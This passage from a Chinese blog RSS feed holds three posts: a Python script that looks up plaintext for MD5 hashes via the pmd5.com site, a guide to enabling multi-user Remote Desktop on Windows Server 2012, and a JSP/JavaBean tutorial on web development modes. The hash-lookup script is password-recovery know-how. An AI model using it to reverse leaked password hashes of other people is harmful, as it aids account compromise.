&lt;p&gt;然后我们将其数据转换为字典的模式&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172447775-776633247.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后创建一个测试脚本看看能不能成功访问&lt;/p&gt;
&lt;p&gt;（200会返回代码，500返回报错）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172558172-2020292139.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到请求成功了，&lt;/p&gt;
&lt;p&gt;我们接下来去找解密出来的md5&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172745870-1372032277.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;发现其在em标签，上bs4模块&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172819151-270501826.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后我们就可以看到过滤好的解密内容与md5&lt;/p&gt;
&lt;p&gt;然后我们写一个命令参数的脚本&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;46&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
import requests
from bs4 import BeautifulSoup
import optparse
def main():
    usage=&quot;[-m  md5 decryption]&quot;
    parser=optparse.OptionParser(usage)
    parser.add_option('-m',dest='md5',help='md5 decryption')
    (options,args)=parser.parse_args()
    if options.md5:
        md5=options.md5
        Md5(md5)
    else:
        parser.print_help()
        exit()

def Md5(md5):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}
    data = {
        '__VIEWSTATE': '/wEPDwUKMTM4NTE3OTkzOWRkP4hmXYtPPhcBjbupZdLOLfmeTK4=',
        '__VIEWSTATEGENERATOR': 'CA0B0334',
        '__EVENTVALIDATION': '/wEWAwK75ZuyDwLigPTXCQKU9f3vAheUenitfEuJ6eGUVe2GyFzb7HKC',
        'key': '{}'.format(md5),
        'jiemi': 'MD5解密'
    }
    url = &quot;http://pmd5.com/&quot;
    r = requests.post(url, headers=header, data=data)
    sd = r.content.decode('utf-8')
    esdf = BeautifulSoup(sd, 'html.parser')
    for l in esdf.find_all('em'):
        g = l.get_text()
        print('--------[*]PMD5接口--------')
        print(g)

if __name__ == '__main__':
    main()
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172925004-1302838187.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201802/1174022-20180222172944331-1326263608.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;完美解出！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;距离上学还是3天&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 22 Feb 2018 09:30:00 +0000</pubDate>
<dc:creator>东京$</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/haq5201314/p/8459587.html</dc:identifier>
</item>
<item>
<title>Windows Server 2012开启多人远程 - Zhe.Song</title>
<link>http://www.cnblogs.com/zhesong/p/wsrd.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhesong/p/wsrd.html</guid>
<description>&lt;p&gt;首先在Server Roles中选择Remote Desktop Services，然后在Role Services中安装Remote Desktop Session Host&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1334336/201802/1334336-20180222170849726-464854433.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装完成后需要重启机器。 &lt;/p&gt;
&lt;p&gt;然后在Run中输入gpedit.msc &lt;/p&gt;
&lt;p&gt;到Computer Configuration-&amp;gt;Administrative Templates-&amp;gt;Windows Components-&amp;gt;Remote Desktop Services-&amp;gt;Remote Desktop Session Host-&amp;gt;Connections&lt;/p&gt;
&lt;p&gt;其中有2个Setting相关&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Limit number of connections&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;是否限制最大连接数量，建议限制一下，以防过多连接（如果Not Configured或者Disabled则会允许用户无限连接，最大999999）&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Restrict Remote Desktop Services users to a single Remote Desktop Services session&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;是否限制使用同一用户多次连接&lt;/p&gt;
&lt;p&gt;简单设置下，我这里设置如下：&lt;/p&gt;
&lt;p&gt;Limit number of connections的值为5&lt;/p&gt;
&lt;p&gt;Restrict Remote Desktop Services users to a single Remote Desktop Services session为Disabled&lt;/p&gt;
&lt;p&gt;设置完成后，需要在Run中输入gpupdate更新当前Policy，否则会按照原来的设置。&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 09:15:00 +0000</pubDate>
<dc:creator>Zhe.Song</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhesong/p/wsrd.html</dc:identifier>
</item>
<item>
<title>Web开发模式【Mode I 和Mode II的介绍、应用案例】 - Java3y</title>
<link>http://www.cnblogs.com/Java3y/p/8459496.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Java3y/p/8459496.html</guid>
<description>&lt;p&gt;&lt;strong&gt;在Web开发模式中，有两个主要的开发结构，称为模式一（Mode I）和模式二（Mode II）.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先我们来理清一些概念吧：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;DAO(Data Access Object)：主要对数据的操作，增加、修改、删除等原子性操作。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Web层：界面+控制器，也就是说JSP【界面】+Servlet【控制器】&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Service业务层：将多个原子性的DAO操作进行组合，组合成一个完整的业务逻辑&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;控制层：主要使用Servlet进行控制&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据访问层：使用DAO、Hibernate、JDBC技术实现对数据的增删改查&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JavaBean用于封装数据，处理部分核心逻辑，每一层中都用到！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;模式一指的就是&lt;strong&gt;在开发中将显示层、控制层、数据层的操作统一交给JSP或者JavaBean来进行处理&lt;/strong&gt;！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模式一有两种情况：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;完全使用JSP做开发&lt;/strong&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;开发速度贼快，只要写JSP就行了，JavaBean和Servlet都不用设计！&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;小幅度修改代码方便，直接修改JSP页面交给WEB容器就行了，不像Servlet还要编译成.class文件再交给服务器！【当然了，在ide下开发这个也不算是事】&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;程序的可读性差、复用性低、代码复杂！什么jsp代码、html代码都往上面写，这肯定很难阅读，很难重用！&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用JSP+JavaBean做开发&lt;/strong&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;程序的可读性较高，大部分的代码都写在JavaBean上，不会和HTML代码混合在一起，可读性还行的&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可重复利用高，核心的代码都由JavaBean开发了，JavaBean的设计就是用来重用、封装，大大减少编写重复代码的工作！&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;没有流程控制，程序中的JSP页面都需要检查请求的参数是否正确，异常发生时的处理。显示操作和业务逻辑代码工作会紧密耦合在一起的！日后维护会困难&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;应用例子&quot;&gt;应用例子：&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;我们使用JavaBean+JSP开发一个简易的计算器吧，效果如图下&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/SOZP41q.png&quot;/&gt;&lt;img src=&quot;http://i.imgur.com/g6W79VD.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先开发JavaBean对象&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; Calculator {
    
        &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; firstNum;
        &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; secondNum;
        &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; Operator = '+';
        &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; result;
    
    
        &lt;span class=&quot;co&quot;&gt;//JavaBean提供了计算的功能&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;calculate&lt;/span&gt;() {
    
            &lt;span class=&quot;kw&quot;&gt;switch&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Operator&lt;/span&gt;) {
                &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; '+':
                    &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;result&lt;/span&gt; = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;firstNum&lt;/span&gt; + &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;secondNum&lt;/span&gt;;
                    &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;;
    
                &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; '-':
                    &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;result&lt;/span&gt; = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;firstNum&lt;/span&gt; - &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;secondNum&lt;/span&gt;;
                    &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;;
    
                &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; '*':
                    &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;result&lt;/span&gt; = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;firstNum&lt;/span&gt; * &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;secondNum&lt;/span&gt;;
                    &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;;
    
                &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; '/':
                    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;secondNum&lt;/span&gt; == &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;) {
                        &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;除数不能为0&quot;&lt;/span&gt;);
                    }
                    &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;result&lt;/span&gt; = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;firstNum&lt;/span&gt; / &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;secondNum&lt;/span&gt;;
                    &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;;
    
                &lt;span class=&quot;kw&quot;&gt;default&lt;/span&gt;:
                    &lt;span class=&quot;kw&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;st&quot;&gt;&quot;传入的字符非法！&quot;&lt;/span&gt;);
            }
        }
    
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;getFirstNum&lt;/span&gt;() {
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; firstNum;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;setFirstNum&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; firstNum) {
            &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;firstNum&lt;/span&gt; = firstNum;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;getSecondNum&lt;/span&gt;() {
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; secondNum;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;setSecondNum&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; secondNum) {
            &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;secondNum&lt;/span&gt; = secondNum;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;getOperator&lt;/span&gt;() {
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; Operator;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;setOperator&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; operator) {
            Operator = operator;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;getResult&lt;/span&gt;() {
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; result;
        }
    
        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;setResult&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;double&lt;/span&gt; result) {
            &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;result&lt;/span&gt; = result;
        }
    }
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;再开发显示页面&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;
    &lt;span class=&quot;er&quot;&gt;&amp;lt;&lt;/span&gt;%--开发用户界面--%&amp;gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;form&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; action=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;/zhongfucheng/1.jsp&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; method=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;table&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; border=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; colspan=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;简单计数器&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;第一个参数：&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;firstNum&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;运算符&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;kw&quot;&gt;&amp;lt;select&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;operator&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;kw&quot;&gt;&amp;lt;option&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;+&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;+&lt;span class=&quot;kw&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;kw&quot;&gt;&amp;lt;option&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;-&lt;span class=&quot;kw&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;kw&quot;&gt;&amp;lt;option&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;*&lt;span class=&quot;kw&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;kw&quot;&gt;&amp;lt;option&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;kw&quot;&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/select&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;第二个参数：&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text &quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;secondNum&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; colspan=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;提交&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/n0wf531.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;获取得到显示页面提交的参数，调用JavaBean的方法，最后输出结果！&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode jsp&quot;&gt;
&lt;code class=&quot;sourceCode jsp&quot;&gt;
    &lt;span class=&quot;co&quot;&gt;&amp;lt;%--获取得到Bean对象--%&amp;gt;&lt;/span&gt;
    &amp;lt;jsp:useBean&lt;span class=&quot;ot&quot;&gt; id&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; class&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;domain.Calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; scope&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;page&quot;&lt;/span&gt;/&amp;gt;
    
    &lt;span class=&quot;co&quot;&gt;&amp;lt;%--设置Bean对象的数据--%&amp;gt;&lt;/span&gt;
    &amp;lt;jsp:setProperty&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; property&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;*&quot;&lt;/span&gt;/&amp;gt;
    
    &lt;span class=&quot;co&quot;&gt;&amp;lt;%--调用Caculator的方法计算出值--%&amp;gt;&lt;/span&gt;
    &amp;lt;jsp:scriptlet&amp;gt;
        calculator.calculate();
    &amp;lt;/jsp:scriptlet&amp;gt;
    
    
    &amp;lt;%--得出的结果：--%&amp;gt;
    
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;c:out&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;计算得出的结果是：&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;/&amp;gt;&lt;/span&gt;
    &amp;lt;jsp:getProperty&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; property&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;firstNum&quot;&lt;/span&gt;/&amp;gt;
    &amp;lt;jsp:getProperty&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; property&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;operator&quot;&lt;/span&gt;/&amp;gt;
    &amp;lt;jsp:getProperty&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; property&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;secondNum&quot;&lt;/span&gt;/&amp;gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;c:out&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value&lt;/span&gt;=&lt;span class=&quot;dt&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;/&amp;gt;&lt;/span&gt;
    &amp;lt;jsp:getProperty&lt;span class=&quot;ot&quot;&gt; name&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;calculator&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; property&lt;/span&gt;=&lt;span class=&quot;st&quot;&gt;&quot;result&quot;&lt;/span&gt;/&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/AVFowrV.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;开发这个简易的计算器，只用了一个JSP页面和一个JavaBean完成！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总的来说，Mode I 适合小型的开发，复杂程序低的开发，因为Mode I 的特点就是开发速度快，但在进行维护的时候就要付出更大的代价！&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;strong&gt;Mode II 中所有的开发都是以Servlet为主体展开的，由Servlet接收所有的客户端请求，然后根据请求调用相对应的JavaBean，并所有的显示结果交给JSP完成！，也就是俗称的MVC设计模式！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/GKFgwzR.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MVC设计模式：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;显示层（View）：主要负责接受Servlet传递的内容，调用JavaBean，将内容显示给用户&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;控制层（Controller）：主要负责所有用户的请求参数，判断请求参数是否合法，根据请求的类型调用JavaBean，将最终的处理结果交给显示层显示！&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模型层（Mode）：模型层包括了业务层，DAO层。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;应用例子-1&quot;&gt;应用例子：&lt;/h2&gt;
